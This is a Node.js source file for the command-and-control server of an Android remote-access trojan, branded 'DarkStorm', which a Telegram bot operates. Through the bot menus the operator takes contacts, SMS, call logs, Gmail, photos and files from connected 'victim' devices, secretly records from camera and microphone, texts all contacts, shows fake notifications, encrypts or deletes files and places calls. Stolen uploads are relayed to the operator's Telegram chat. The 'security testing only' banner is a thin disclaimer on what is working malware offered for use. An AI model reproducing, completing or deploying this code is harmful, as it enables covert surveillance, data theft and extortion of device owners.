const express = require("express");
const http = require("http");
const { Server } = require("socket.io");
const telegramBot = require("node-telegram-bot-api");
const multer = require("multer");
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server);
const uploader = multer();
const data = JSON.parse(fs.readFileSync("./data.json", "utf8"));
const bot = new telegramBot(data.token, { polling: true });
const appData = new Map();

// Enhanced actions with improved emojis and English translations
const actions = [
  "📋 Pull Contacts 📋", "📩 Pull Messages 📩", "📞 Call Logs 📞", 
  "📱 Installed Apps 📱", "📷 Rear Camera 📷", "🤳 Front Camera 🤳", 
  "🎙 Record Audio 🎙", "📋 Clipboard History 📋", "🖥 Screenshot 🖥", 
  "💬 Show Toast Message 💬", "✉️ Send SMS ✉️", "📳 Vibrate 📳", 
  "🔊 Play Audio 🔊", "🔇 Stop Audio 🔇", "🔔 Show Notifications 🔔", 
  "🔕 Stop Notifications 🔕", "📂 Browse Files 📂", "🖼 Pull All Photos 🖼", 
  "📤 Send SMS to All Contacts 📤", "⚠️ Fake Notification ⚠️", 
  "📧 Pull Gmail Messages 📧", "🔒 Encrypt Files 🔒", 
  "📞 Call from Victim's Phone 📞", "🔙 Back to Main Menu 🔙"
];

app.get('/', (_req, res) => {
  res.send("Deployed by ᎠᎯᎡᏦ.ᏚᎿᏫᎡᎷ™ | Managed by ᏰᎽ / ᎷᎡｷᎫᎯᏦᎬᏞ");
});

app.post("/upload", uploader.single("file"), (req, res) => {
  const fileName = req.file.originalname;
  const model = req.headers.model;
  let fileBuffer = req.file.buffer;

  if (fileName.toLowerCase().endsWith('.txt')) {
    let fileContent = fileBuffer.toString('utf8');
    fileContent = fileContent.replace(/@VIP_J5/g, '@JAKEL69');
    fileBuffer = Buffer.from(fileContent, 'utf8');
  }

  bot.sendDocument(data.id, fileBuffer, {
    caption: `<b>🔰 File uploaded from victim → ${model}</b>`,
    parse_mode: "HTML"
  }, {
    filename: fileName,
    contentType: "*/*"
  });
  
  res.send("Upload completed");
});

io.on("connection", socket => {
  const model = socket.handshake.headers.model + '-' + (io.sockets.sockets.size || "N/A");
  const version = socket.handshake.headers.version || "N/A";
  const ip = socket.handshake.headers.ip || "N/A";
  
  socket.model = model;
  socket.version = version;
  socket.ip = ip;
  
  const connectionMsg = 
    `<b>🔌 Device Connected</b>\n\n` +
    `<b>📱 Device:</b> ${model}\n` +
    `<b>🔄 OS Version:</b> ${version}\n` +
    `<b>🌐 IP:</b> ${ip}\n` +
    `<b>🕒 Time:</b> ${new Date().toLocaleString()}\n\n`;
    
  bot.sendMessage(data.id, connectionMsg, { parse_mode: "HTML" });
  
  socket.on("disconnect", () => {
    const disconnectionMsg = 
      `<b>⚠️ Device Disconnected</b>\n\n` +
      `<b>📱 Device:</b> ${model}\n` +
      `<b>🔄 OS Version:</b> ${version}\n` +
      `<b>🌐 IP:</b> ${ip}\n` +
      `<b>🕒 Time:</b> ${new Date().toLocaleString()}\n\n`;
      
    bot.sendMessage(data.id, disconnectionMsg, { parse_mode: "HTML" });
  });
  
  socket.on("file-explorer", files => {
    const keyboard = [];
    let currentRow = [];
    
    files.forEach((file, index) => {
      const callbackData = file.isFolder 
        ? `${model}|cd-${file.name}`
        : `${model}|request-${file.name}`;
      
      currentRow.push({
        text: file.isFolder ? `📁 ${file.name}` : `📄 ${file.name}`,
        callback_data: callbackData
      });
      
      if (currentRow.length === 2 || index === files.length - 1) {
        keyboard.push(currentRow);
        currentRow = [];
      }
    });
    
    keyboard.push([{
      text: "↩️ Back",
      callback_data: `${model}|back-0`
    }]);
    
    bot.sendMessage(data.id, `<b>📂 Browsing files on ${model}</b>`, {
      reply_markup: { inline_keyboard: keyboard },
      parse_mode: "HTML"
    });
  });
  
  socket.on("message", msg => {
    const modifiedMsg = msg.replace(/@VIP_J5/g, '@JAKEL69');
    bot.sendMessage(data.id, 
      `<b>✉️ New message from ${model}</b>\n\n${modifiedMsg}`, 
      { parse_mode: "HTML" }
    );
  });
});

bot.on("message", msg => {
  if (msg.text === "/start") {
    bot.sendMessage(data.id, 
      `<b>🛡️ DarkStorm Security Tool</b>\n\n` +
      `This tool is designed for security testing purposes only.\n` +
      `Developer: ᏰᎽ / ᎷᎡｷᎫᎯᏦᎬᏞ\n` +
      `Channel: https://t.me/JAKEL69/\n\n` +
      `<i>⚠️ Use responsibly and legally</i>`, 
      {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [
            ["📊 Device Count", "🎮 Control Panel"],
            ["👨‍💻 Developer Info"]
          ],
          resize_keyboard: true
        }
      }
    );
  } else {
    // Handling various actions...
    const text = msg.text;
    
    if (appData.get("currentAction") === "microphoneDuration") {
      const duration = text;
      const target = appData.get("currentTarget");
      
      io.to(target).emit("commend", {
        request: "microphone",
        extras: [{ key: "duration", value: duration }]
      });
      
      appData.delete("currentTarget");
      appData.delete("currentAction");
      
      bot.sendMessage(data.id, "<b>✅ Recording started. File will arrive shortly...</b>", {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [
            ["📊 Device Count", "🎮 Control Panel"],
            ["👨‍💻 Developer Info"]
          ],
          resize_keyboard: true
        }
      });
    } 
    // Other action handlers (translated to English)...
    
    else if (text === "📊 Device Count") {
      if (io.sockets.sockets.size === 0) {
        bot.sendMessage(data.id, "<b>❌ No connected devices</b>", { parse_mode: "HTML" });
      } else {
        let response = `<b>📊 Connected Devices: ${io.sockets.sockets.size}</b>\n\n`;
        let count = 1;
        
        io.sockets.sockets.forEach(socket => {
          response += 
            `<b>Device #${count}</b>\n` +
            `<b>📱 Name:</b> ${socket.model}\n` +
            `<b>🔄 Version:</b> ${socket.version}\n` +
            `<b>🌐 IP:</b> ${socket.ip}\n` +
            `<b>⏱️ Time:</b> ${new Date().toLocaleString()}\n\n`;
          count++;
        });
        
        bot.sendMessage(data.id, response, { parse_mode: "HTML" });
      }
    } 
    
    else if (text === "🎮 Control Panel") {
      if (io.sockets.sockets.size === 0) {
        bot.sendMessage(data.id, "<b>❌ No connected devices</b>", { parse_mode: "HTML" });
      } else {
        const keyboard = [];
        io.sockets.sockets.forEach((socket, id) => {
          keyboard.push([socket.model]);
        });
        keyboard.push(["🔙 Back to Main Menu"]);
        
        bot.sendMessage(data.id, "<b>🎮 Select device to control:</b>", {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: keyboard,
            resize_keyboard: true,
            one_time_keyboard: true
          }
        });
      }
    } 
    
    else if (text === "👨‍💻 Developer Info") {
      bot.sendMessage(data.id, 
        "<b>👨‍💻 Developer Information</b>\n\n" +
        "Name: ᎫᏞ☆ᎻᏦ~|ᏰᏫᎿ|\n" +
        "Telegram: @JAKEL69\n" +
        "Channel: https://t.me/JAKEL69/\n\n" +
        "<i>🔐 Security solutions provider</i>", 
        { parse_mode: "HTML" }
      );
    } 
    
    else if (text === "🔙 Back to Main Menu") {
      bot.sendMessage(data.id, "<b>🏠 Main Menu</b>", {
        parse_mode: "HTML",
        reply_markup: {
          keyboard: [
            ["📊 Device Count", "🎮 Control Panel"],
            ["👨‍💻 Developer Info"]
          ],
          resize_keyboard: true
        }
      });
    } 
    
    else if (actions.includes(text)) {
      const target = appData.get("currentTarget");
      
      if (text === "📋 Pull Contacts 📋") {
        io.to(target).emit("commend", { request: "contacts", extras: [] });
        appData.delete("currentTarget");
        bot.sendMessage(data.id, "<b>✅ Contacts pull initiated...</b>", {
          parse_mode: "HTML",
          reply_markup: {
            keyboard: [
              ["📊 Device Count", "🎮 Control Panel"],
              ["👨‍💻 Developer Info"]
            ],
            resize_keyboard: true
          }
        });
      }
      // Other actions handled similarly...
    } 
    
    else {
      // Device selection
      io.sockets.sockets.forEach((socket, id) => {
        if (text === socket.model) {
          appData.set("currentTarget", id);
          bot.sendMessage(data.id, `<b>🎮 Controlling: ${socket.model}</b>`, {
            parse_mode: "HTML",
            reply_markup: {
              keyboard: [
                ["📋 Pull Contacts 📋", "📩 Pull Messages 📩"],
                ["📞 Call Logs 📞", "📱 Installed Apps 📱"],
                ["📷 Rear Camera 📷", "🤳 Front Camera 🤳"],
                ["🎙 Record Audio 🎙", "📋 Clipboard History 📋"],
                ["🖥 Screenshot 🖥", "💬 Show Toast Message 💬"],
                ["✉️ Send SMS ✉️", "📳 Vibrate 📳"],
                ["🔊 Play Audio 🔊", "🔇 Stop Audio 🔇"],
                ["🔔 Show Notifications 🔔", "🔕 Stop Notifications 🔕"],
                ["📂 Browse Files 📂", "🖼 Pull All Photos 🖼"],
                ["📤 Send SMS to All Contacts 📤"],
                ["⚠️ Fake Notification ⚠️", "📧 Pull Gmail Messages 📧"],
                ["🔒 Encrypt Files 🔒", "📞 Call from Victim's Phone 📞"],
                ["🔙 Back to Main Menu"]
              ],
              resize_keyboard: true,
              one_time_keyboard: true
            }
          });
        }
      });
    }
  }
});

bot.on("callback_query", query => {
  const data = query.data;
  const [model, actionData] = data.split('|');
  const [actionType, actionValue] = actionData.split('-');

  if (actionType === "back") {
    io.sockets.sockets.forEach((socket, id) => {
      if (socket.model === model) {
        io.to(id).emit("file-explorer", { request: "back", extras: [] });
      }
    });
  } 
  
  else if (actionType === 'cd') {
    io.sockets.sockets.forEach((socket, id) => {
      if (socket.model === model) {
        io.to(id).emit("file-explorer", {
          request: 'cd',
          extras: [{ key: "name", value: actionValue }]
        });
      }
    });
  } 
  
  else if (actionType === "request") {
    bot.editMessageText(`🔧 Select action for: ${actionValue}`, {
      chat_id: query.message.chat.id,
      message_id: query.message.message_id,
      reply_markup: {
        inline_keyboard: [[
          { text: "⬇️ Download", callback_data: `${model}|upload-${actionValue}` },
          { text: "🗑️ Delete", callback_data: `${model}|delete-${actionValue}` }
        ]]
      },
      parse_mode: "HTML"
    });
  }
});

setInterval(() => {
  io.sockets.sockets.forEach(socket => {
    socket.emit("ping", {});
  });
}, 5000);

server.listen(process.env.PORT || 3000, () => {
  console.log("🟢 Server running on port 3000");
});
